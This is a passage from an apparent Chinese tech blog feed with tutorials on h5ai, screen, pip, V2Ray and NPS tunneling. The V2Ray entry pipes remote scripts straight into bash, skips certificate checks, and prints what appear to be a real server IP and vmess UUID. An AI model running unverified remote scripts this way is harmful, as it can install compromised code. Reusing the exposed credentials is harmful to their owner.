class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install ImageMagick -y</span><br></pre></td></tr></table></figure></li><li><p><strong>EXIF</strong></p><ol><li><p>进入php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;lnmp1.4-full&#x2F;src&#x2F;php-5.6.31&#x2F;ext</span><br></pre></td></tr></table></figure></li><li><p>进入exif</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd exif &amp;&amp; &#x2F;usr&#x2F;local&#x2F;php&#x2F;bin&#x2F;phpize</span><br></pre></td></tr></table></figure></li><li><p>配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;configure --with-php-config&#x3D;&#x2F;usr&#x2F;local&#x2F;php&#x2F;bin&#x2F;php-config</span><br></pre></td></tr></table></figure></li><li><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure></li><li><p>增加配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;php&#x2F;conf.d</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim 008-exif.ini</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension &#x3D; &quot;exif.so&quot;</span><br></pre></td></tr></table></figure></li><li><p>重启php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service php-fpm restart</span><br></pre></td></tr></table></figure></li></ol></li></ol><h2 id="四、个性化配置"><a href="#四、个性化配置" class="headerlink" title="四、个性化配置"></a>四、个性化配置</h2><p>H5ai可以启用一些个性化服务，只需要修改相关配置即可。配置路径：</p><p><code>_h5ai/private/conf/options.json</code></p><ol><li><p><strong>开启文件搜索</strong></p><p>在配置文件中搜索“search”，将false改为ture</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &quot;search&quot;: &#123;</span><br><span class="line">&quot;enabled&quot;: true,</span><br><span class="line">&quot;advanced&quot;: true,</span><br><span class="line">&quot;debounceTime&quot;: 300,</span><br><span class="line">&quot;ignorecase&quot;: true</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li><li><p><strong>打包下载</strong></p><p>在配置文件中搜索“select”，增加复选框</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;select&quot;: &#123;</span><br><span class="line">&quot;enabled&quot;: true,     </span><br><span class="line">&quot;clickndrag&quot;: true,     </span><br><span class="line">&quot;checkboxes&quot;: true</span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure><p>继续搜索“download”，将false改为ture。注意查看默认打包的格式，可以选择默认的<code>.tar</code>也可以改成<code>.zip</code>，只需要将php-tar改为shell-zip</p></li><li><p><strong>二维码扫码下载</strong><br>在配置文件中搜索“info”，将false改为true，即可以实现通过扫码下载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;info&quot;: &#123;</span><br><span class="line">&quot;enabled&quot;: true,</span><br><span class="line">    &quot;show&quot;: true,</span><br><span class="line">    &quot;qrcode&quot;: true,</span><br><span class="line">    &quot;qrFill&quot;: &quot;#999&quot;,</span><br><span class="line">    &quot;qrBack&quot;: &quot;#fff&quot;</span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure></li></ol><p>更简单的方法可以使用“宝塔面板”进行搭建：<a href="https://www.ratodo.com/article/h5ai-share.html/">使用宝塔面板和h5ai搭建资源分享站</a></p><p>也可以看看这篇文章：<a href="https://www.n-1.cn/29.html/">h5ai 目录列表程序完整安装使用教程</a></p><h1 id="利用docker进行搭建"><a href="#利用docker进行搭建" class="headerlink" title="利用docker进行搭建"></a>利用docker进行搭建</h1><h3 id="拉取并配置镜像"><a href="#拉取并配置镜像" class="headerlink" title="拉取并配置镜像"></a>拉取并配置镜像</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#命令</span><br><span class="line">docker run [-t&#x2F;-d] -p [80]:80 -v [$PWD]:&#x2F;h5ai --name h5ai ilemonrain&#x2F;h5ai:[lite&#x2F;full]</span><br><span class="line"></span><br><span class="line">#示例</span><br><span class="line">docker run --restart&#x3D;always -t -p 8081:80 -d -v &#x2F;opt&#x2F;h5ai:&#x2F;h5ai --name h5ai ilemonrain&#x2F;h5ai:full</span><br></pre></td></tr></table></figure><ul><li><strong>-d/-t：</strong>决定是以<strong>后台运行模式启动</strong>或<strong>是前台监控模式启动</strong>。 使用-d参数启动，镜像将不会输出任何日志到你的Console，直接以Daemon模式启动。Deamon模式启动下，可以使用docker logs h5ai命令显示启动日志。 使用-t参数启动，将会直接Attach你的镜像到你的Console，这个模式启动下，你可以直观的看到镜像的启动过程，适合于初次部署镜像，以及镜像Debug部署使用。你可以使用Ctrl+C将Docker镜像转入后台运行，使用docker attach h5ai命令显示启动日志。 </li><li><strong>-p [80]:80：</strong>h5ai on Docker 需要映射的端口，<strong>方括号中端口可任意修改为你需要的端口</strong>。</li><li><strong>-v /home/h5ai:/h5ai：</strong>映射目录，将会自动在选定的目录下创建h5ai程序目录(_h5ai)和Apache2必要的.htaccess文件，如果在在使用完成后不需要这两个文件，可以自行删除；如果需要映射当前目录(可以使用pwd命令确定)，请直接输入 “$PWD”。 </li><li><strong>–name h5ai：</strong>Docker容器的名称，可以自行修改。 #ilemonrain/h5ai:[lite/full]：启动的镜像名称，请注意：如果你只是为了测试镜像，或者Docker宿主机所在网络环境不佳，请使用lite分支 (即 ilemonrain/h5ai , ilemonrain/h5ai:latest , ilemonrain/h5ai:lite均可)；正式使用或者需要完整功能，请使用full分支 (ilemonrain/h5ai:full)。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> vps </tag>
            
            <tag> LAMP </tag>
            
            <tag> H5ai </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个好用的命令——screen</title>
      <link href="2020/08/15/Screen/"/>
      <url>2020/08/15/Screen/</url>
      
        <content type="html"><![CDATA[<h1 id="screen命令使用方法"><a href="#screen命令使用方法" class="headerlink" title="screen命令使用方法"></a>screen命令使用方法</h1><h2 id="什么是screen"><a href="#什么是screen" class="headerlink" title="什么是screen"></a>什么是screen</h2><p>Linux screen命令用于多重视窗管理程序，此处所谓的视窗，是指一个全屏幕的文字模式画面。通常只有在使用telnet登入主机或是使用老式的终端机时，才有可能用到screen程序。</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen [-AmRvx -ls -wipe][-d &lt;作业名称&gt;][-h &lt;行数&gt;][-r &lt;作业名称&gt;][-s &lt;shell&gt;][-S &lt;作业名称&gt;]</span><br></pre></td></tr></table></figure></blockquote><p><strong>参数说明</strong>：</p><ul><li>-A 　将所有的视窗都调整为目前终端机的大小。</li><li>-d&lt;作业名称&gt; 　将指定的screen作业离线。</li><li>-h&lt;行数&gt; 　指定视窗的缓冲区行数。</li><li>-m 　即使目前已在作业中的screen作业，仍强制建立新的screen作业。</li><li>-r&lt;作业名称&gt; 　恢复离线的screen作业。</li><li>-R 　先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业。</li><li>-s <shell> 　指定建立新视窗时，所要执行的shell。</li><li>-S&lt;作业名称&gt; 　指定screen作业的名称。</li><li>-v 　显示版本信息。</li><li>-x 　恢复之前离线的screen作业。</li><li>-ls或–list 　显示目前所有的screen作业。</li><li>-wipe 　检查目前所有的screen作业，并删除已经无法使用的screen作业。</li></ul><h2 id="下载screen"><a href="#下载screen" class="headerlink" title="下载screen"></a>下载screen</h2><p>除部分精简的系统或者定制的系统大部分都安装了screen命令，如果没有安装，CentOS系统可以执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install screen</span><br><span class="line">yum install screen</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>CentOS 8上移除了screen，需要<a href="https://www.vpser.net/manage/centos-rhel-linux-third-party-source-epel.html">安装epel</a>后安装screen执行</p><p>Debian/Ubuntu系统执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install screen</span><br></pre></td></tr></table></figure><h2 id="常见screen命令"><a href="#常见screen命令" class="headerlink" title="常见screen命令"></a>常见screen命令</h2><h3 id="创建screen会话"><a href="#创建screen会话" class="headerlink" title="创建screen会话"></a>创建screen会话</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -S lnmp</span><br></pre></td></tr></table></figure><p>screen就会创建一个名字为lnmp的会话</p><h3 id="查看当前系统screen运行窗口"><a href="#查看当前系统screen运行窗口" class="headerlink" title="查看当前系统screen运行窗口"></a>查看当前系统screen运行窗口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen ls</span><br></pre></td></tr></table></figure><h3 id="删除一个窗口"><a href="#删除一个窗口" class="headerlink" title="删除一个窗口"></a>删除一个窗口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -X -S 122128 quit# 这里的122128是窗口ID号，我们可以ls查看</span><br></pre></td></tr></table></figure><h3 id="暂时离开，保留screen会话中的任务或程序"><a href="#暂时离开，保留screen会话中的任务或程序" class="headerlink" title="暂时离开，保留screen会话中的任务或程序"></a>暂时离开，保留screen会话中的任务或程序</h3><p>当需要临时离开时（会话中的程序不会关闭，仍在运行）可以用快捷键Ctrl+a d(即按住Ctrl，依次再按a,d)</p><h3 id="恢复screen会话"><a href="#恢复screen会话" class="headerlink" title="恢复screen会话"></a>恢复screen会话</h3><p>当回来时可以再执行执行：<strong>screen -r lnmp</strong> 即可恢复到离开前创建的lnmp会话的工作界面。如果忘记了，或者当时没有指定会话名，可以执行：<strong>screen -ls</strong> screen会列出当前存在的会话列表，如下图：<br><a href="https://www.vpser.net/uploads/2010/10/screen-ls.jpg"><img src="https://www.vpser.net/uploads/2010/10/screen-ls.jpg" alt="screen-ls"></a></p><p>11791.lnmp即为刚才的screen创建的lnmp会话，目前已经暂时退出了lnmp会话，所以状态为Detached，当使用screen -r lnmp后状态就会变为Attached，11791是这个screen的会话的进程ID，恢复会话时也可以使用：<strong>screen -r 11791</strong></p><h3 id="关闭screen的会话"><a href="#关闭screen的会话" class="headerlink" title="关闭screen的会话"></a>关闭screen的会话</h3><p>执行：<strong>exit</strong> ，会提示：[screen is terminating]，表示已经成功退出screen会话。</p><h3 id="远程演示"><a href="#远程演示" class="headerlink" title="远程演示"></a>远程演示</h3><p>首先演示者先在服务器上执行 <strong>screen -S test</strong> 创建一个screen会话，观众可以链接到远程服务器上执行<strong>screen -x test</strong> 观众屏幕上就会出现和演示者同步。</p><h3 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h3><p>Ctrl+a c ：在当前screen会话中创建窗口<br>Ctrl+a w ：窗口列表<br>Ctrl+a n ：下一个窗口<br>Ctrl+a p ：上一个窗口<br>Ctrl+a 0-9 ：在第0个窗口和第9个窗口之间切换</p>]]></content>
      
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> vps </tag>
            
            <tag> screen </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python pip 安装与使用</title>
      <link href="2020/08/06/Python%20pip%20%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
      <url>2020/08/06/Python%20pip%20%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-pip-安装与使用"><a href="#Python-pip-安装与使用" class="headerlink" title="Python pip 安装与使用"></a>Python pip 安装与使用</h1><p>判断pip安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip --version</span><br></pre></td></tr></table></figure><p>如果你还未安装，则可以使用以下方法来安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py -o get-pip.py   # 下载安装脚本</span><br><span class="line">$ sudo python get-pip.py    # 运行安装脚本</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意：</strong>用哪个版本的 Python 运行安装脚本，pip 就被关联到哪个版本，如果是 Python3 则执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 get-pip.py    # 运行安装脚本。</span><br></pre></td></tr></table></figure><p>一般情况 pip 对应的是 Python 2.7，pip3 对应的是 Python 3.x。</p></blockquote><p>部分 Linux 发行版可直接用包管理器安装 pip，如 Debian 和 Ubuntu：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-pip</span><br></pre></td></tr></table></figure><h2 id="pip-最常用命令"><a href="#pip-最常用命令" class="headerlink" title="pip 最常用命令"></a>pip 最常用命令</h2><p><strong>显示版本和路径</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip --version</span><br></pre></td></tr></table></figure><p><strong>获取帮助</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip --help</span><br></pre></td></tr></table></figure><p><strong>升级 pip</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U pip</span><br></pre></td></tr></table></figure><blockquote><p>如果这个升级命令出现问题 ，可以使用以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo easy_install --upgrade pip</span><br></pre></td></tr></table></figure></blockquote><p><strong>安装包</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install SomePackage              # 最新版本</span><br><span class="line">pip install SomePackage&#x3D;&#x3D;1.0.4       # 指定版本</span><br><span class="line">pip install &#39;SomePackage&gt;&#x3D;1.0.4&#39;     # 最小版本</span><br></pre></td></tr></table></figure><p>比如我要安装 Django。用以下的一条命令就可以，方便快捷。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Django&#x3D;&#x3D;1.7</span><br></pre></td></tr></table></figure><p><strong>升级包</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade SomePackage</span><br></pre></td></tr></table></figure><p>升级指定的包，通过使用==, &gt;=, &lt;=, &gt;, &lt; 来指定一个版本号。</p><p><strong>卸载包</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip uninstall SomePackage</span><br></pre></td></tr></table></figure><p><strong>搜索包</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip search SomePackage</span><br></pre></td></tr></table></figure><p><strong>显示安装包信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip show </span><br></pre></td></tr></table></figure><p><strong>查看指定包的详细信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip show -f SomePackage</span><br></pre></td></tr></table></figure><p><strong>列出已安装的包</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip list</span><br></pre></td></tr></table></figure><p><strong>查看可升级的包</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip list -o</span><br></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>如果 Python2 和 Python3 同时有 pip，则使用方法如下：</p><p>Python2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip install XXX</span><br></pre></td></tr></table></figure><p>Python3:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install XXX</span><br></pre></td></tr></table></figure><p>若由于一些局域网的原因，使用 pip 出现 “connection timeout”，连接超时可以使用国内的镜像网站下载：</p><ul><li> <a href="http://e.pypi.python.org/">http://e.pypi.python.org</a></li><li> <a href="http://pypi.douban.com/simple">http://pypi.douban.com/simple</a></li></ul><p>命令如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install -i http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple --trusted-host pypi.douban.com packagename # packagename是要下载的包的名字</span><br><span class="line">pip install -i http:&#x2F;&#x2F;e.pypi.python.org --trusted-host e.pypi.python.org --upgrade pip # 升级pip</span><br></pre></td></tr></table></figure><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p><a href="https://blog.csdn.net/kouyi5627/article/details/80531442">Python在终端通过pip安装好包以后，在Pycharm中依然无法使用的解决办法</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Python </tag>
            
            <tag> pip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V2Ray的搭建及使用说明</title>
      <link href="2020/06/20/V2Ray/"/>
      <url>2020/06/20/V2Ray/</url>
      
        <content type="html"><![CDATA[<h1 id="V2Ray的安装及使用说明"><a href="#V2Ray的安装及使用说明" class="headerlink" title="V2Ray的安装及使用说明"></a>V2Ray的安装及使用说明</h1><p>搭建v2ray的步骤大体如下：</p><ul><li>首先你先得准备一个VPS，获得VPS的IP、root用户名及密码、SSH端口(一般为22)等；</li><li>借用Xshell工具登录到自己的VPS;</li><li>安装V2Ray，配置相关信息，完成安装；</li><li>在所需要的设备上添加对应的V2Ray信息就可以成功使用了；</li></ul><p>没有VPS的可以使用跟我一样的<a href="https://www.vultr.com/?ref=8327534">Vulter</a>家的VPS，这家位于国外的VPS厂商价格较为便宜，而且支付方便，直接用支付宝即可完成支付</p><h2 id="一、安装V2Ray"><a href="#一、安装V2Ray" class="headerlink" title="一、安装V2Ray"></a>一、安装V2Ray</h2><p>下载V2Ray</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -s -L https:&#x2F;&#x2F;git.io&#x2F;v2ray.sh)</span><br></pre></td></tr></table></figure><p>根据提示选择安装</p><p>安装完成后，希望最好更改一下SSH连接的默认端口号(22)，并更新Xshell属性中的端口号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;ToyoDAdoubiBackup&#x2F;doubi&#x2F;master&#x2F;ssh_port.sh &amp;&amp; chmod +x ssh_port.sh &amp;&amp; bash ssh_port.sh</span><br></pre></td></tr></table></figure><p>更加详细的安装教学可以查看GitHub上的<a href="%5Bhttps://github.com/233boy/v2ray/wiki/V2Ray%E6%90%AD%E5%BB%BA%E8%AF%A6%E7%BB%86%E5%9B%BE%E6%96%87%E6%95%99%E7%A8%8B%5D(https://github.com/233boy/v2ray/wiki/V2Ray%E6%90%AD%E5%BB%BA%E8%AF%A6%E7%BB%86%E5%9B%BE%E6%96%87%E6%95%99%E7%A8%8B)">V2Ray搭建详细图文教程</a>，相信你一定可以完成安装</p><h2 id="二、查看V2Ray"><a href="#二、查看V2Ray" class="headerlink" title="二、查看V2Ray"></a>二、查看V2Ray</h2><p>查看配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v2ray info</span><br></pre></td></tr></table></figure><p>生成配置连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v2ray url</span><br></pre></td></tr></table></figure><p>最后保存uuid，v2ray的端口号</p><h2 id="三、电脑端使用V2Ray科学上网"><a href="#三、电脑端使用V2Ray科学上网" class="headerlink" title="三、电脑端使用V2Ray科学上网"></a>三、电脑端使用V2Ray科学上网</h2><p>我这里使用的<a href="https://github.com/Dreamacro/clash.git">Clash</a>，这个软件界面简洁，美观，下面是基本的使用方法</p><p>我们需要用文本工具进行编辑，拓展名为<code>.yml</code></p><p>只需更改下面的这三个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">server: 149.28.225.219 #你的VPS的IP地址</span><br><span class="line">port: 63438 #注意这里是V2ray的端口号，不是Xshell的端口号</span><br><span class="line">uuid: 56ef7dbe-8d03-492f-a97a-4a741fabea41 #uuid</span><br></pre></td></tr></table></figure><blockquote><p>port: 7890<br>socks-port: 7891<br>allow-lan: false<br>mode: Rule<br>log-level: info<br>external-controller: 127.0.0.1:9090<br>experimental:<br>  ignore-resolve-fail: true<br>Proxy:</p><ul><li>name: vmess<br>type: vmess<br>server: 149.28.225.219<br>port: 63438<br>uuid: 56ef7dbe-8d03-492f-a97a-4a741fabea41<br>alterId: 233<br>cipher: Auto<br>Proxy Group:</li><li>name: Auto<br>proxies:<ul><li>vmess<br>type: url-test<br>url: <a href="http://www.gstatic.com/generate_204">http://www.gstatic.com/generate_204</a><br>interval: 300</li></ul></li><li>name: Fallback-Auto<br>type: fallback<br>proxies:<ul><li>vmess<br>url: <a href="http://www.gstatic.com/generate_204">http://www.gstatic.com/generate_204</a><br>interval: 300</li></ul></li><li>name: Load-Balance<br>type: load-balance<br>proxies:<ul><li>vmess<br>url: <a href="http://www.gstatic.com/generate_204">http://www.gstatic.com/generate_204</a><br>interval: 300</li></ul></li><li>name: Proxy<br>type: select<br>proxies:<ul><li>vmess</li><li>Auto<br>Rule:</li></ul></li><li>DOMAIN-SUFFIX,google.com,Auto</li><li>DOMAIN-KEYWORD,google,Auto</li><li>DOMAIN,google.com,Auto</li><li>DOMAIN-SUFFIX,ad.com,REJECT</li><li>IP-CIDR,127.0.0.0/8,DIRECT</li><li>SRC-IP-CIDR,192.168.1.201/32,DIRECT</li><li>GEOIP,CN,DIRECT</li><li>DST-PORT,80,DIRECT</li><li>SRC-PORT,7777,DIRECT</li><li>MATCH,Auto</li></ul></blockquote><p>更改完之后，将配置文件扔进<strong>Profiles</strong>中，再在<strong>Genera</strong>l中开启<strong>System Proxy</strong>服务</p><h2 id="四、手机端的科学上网"><a href="#四、手机端的科学上网" class="headerlink" title="四、手机端的科学上网"></a>四、手机端的科学上网</h2><p>我这里用的是<strong>v2rayNG</strong>，需要的请在谷歌商店自行下载，只需要将<strong>Vmess</strong>复制出来再导入，具体使用方法就不介绍了</p><h2 id="五、V2ray加速"><a href="#五、V2ray加速" class="headerlink" title="五、V2ray加速"></a>五、V2ray加速</h2><p>我这里用的是<strong>BBR Plus</strong>进行加速</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate &quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;chiakge&#x2F;Linux-NetSpeed&#x2F;master&#x2F;tcp.sh&quot;</span><br><span class="line"></span><br><span class="line">chmod +x tcp.sh</span><br><span class="line"></span><br><span class="line">.&#x2F;tcp.sh</span><br></pre></td></tr></table></figure><p>在执行<code>./tcp.sh</code>后，进入加速选项，选择<strong>BBR Plus</strong>即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> vps </tag>
            
            <tag> V2Ray </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于NPS的内网穿透搭建</title>
      <link href="2020/06/09/nps%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>2020/06/09/nps%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="NPS内网穿透"><a href="#NPS内网穿透" class="headerlink" title="NPS内网穿透"></a>NPS内网穿透</h1><p>内网穿透我们就不介绍了，我们介绍一下这个内网穿透的项目！</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>这是一款轻量级、高性能、功能强大的内网穿透代理服务器。支持tcp、udp、socks5、http等几乎所有流量转发，可用来访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析、内网socks5代理等等……，并带有功能强大的web管理端。</p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>协议支持全面，兼容几乎所有常用协议，例如tcp、udp、http(s)、socks5、p2p、http代理…</li><li>全平台兼容(linux、windows、macos、群辉等)，支持一键安装为系统服务</li><li>控制全面，同时支持服务端和客户端控制</li><li>https集成，支持将后端代理和web服务转成https，同时支持多证书</li><li>操作简单，只需简单的配置即可在web ui上完成其余操作</li><li>展示信息全面，流量、系统信息、即时带宽、客户端版本等</li><li>扩展功能强大，该有的都有了（缓存、压缩、加密、流量限制、带宽限制、端口复用等等）</li><li>域名解析具备自定义header、404页面配置、host修改、站点保护、URL路由、泛解析等功能</li><li>服务端支持多用户和用户注册功能</li></ul><h2 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h2><h3 id="Doker版拉取并安装nps镜像"><a href="#Doker版拉取并安装nps镜像" class="headerlink" title="Doker版拉取并安装nps镜像"></a>Doker版拉取并安装nps镜像</h3><ul><li>执行以下命令安装nps服务器端</li><li>将**&lt;本机conf目录&gt;**修改为你自己需要保存conf文件的目录</li><li>修改并输入以下命令启动nps服务器</li></ul><p>手动修改端口号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --privileged&#x3D;true --name nps -p 8080:8080 -p 8024:8024 -p 10150-10179:10150-10179 -v &lt;本机conf目录&gt;:&#x2F;nps&#x2F;conf oldiy&#x2F;nps-server:latest</span><br><span class="line"></span><br><span class="line">#示例</span><br><span class="line">docker run -d --privileged&#x3D;true --name nps -p 8080:8080 -p 8024:8024 -p 10150-10179:10150-10179 -v &#x2F;home&#x2F;nps:&#x2F;nps&#x2F;conf oldiy&#x2F;nps-server:latest</span><br></pre></td></tr></table></figure><p>自动，但可能会发生冲突</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --privileged&#x3D;true --name nps --net&#x3D;host -v &lt;本机conf目录&gt;:&#x2F;nps&#x2F;conf oldiy&#x2F;nps-server:latest</span><br></pre></td></tr></table></figure><h3 id="自行搭建"><a href="#自行搭建" class="headerlink" title="自行搭建"></a>自行搭建</h3><p>下载服务端nps，并安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;ehang-io&#x2F;nps&#x2F;releases&#x2F;download&#x2F;v0.26.8&#x2F;linux_amd64_server.tar.gz</span><br><span class="line"></span><br><span class="line">tar -zxvf linux_amd64_server.tar.gz</span><br><span class="line"></span><br><span class="line">.&#x2F;nps start</span><br></pre></td></tr></table></figure><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p>我们去Github下载自己需要的客户端，<a href="https://github.com/ehang-io/nps">NPS项目地址</a></p><h2 id="Web端配置"><a href="#Web端配置" class="headerlink" title="Web端配置"></a>Web端配置</h2><p>此时应该就能访问你的NPS网页了，访问地址是 [你服务IP:端口] 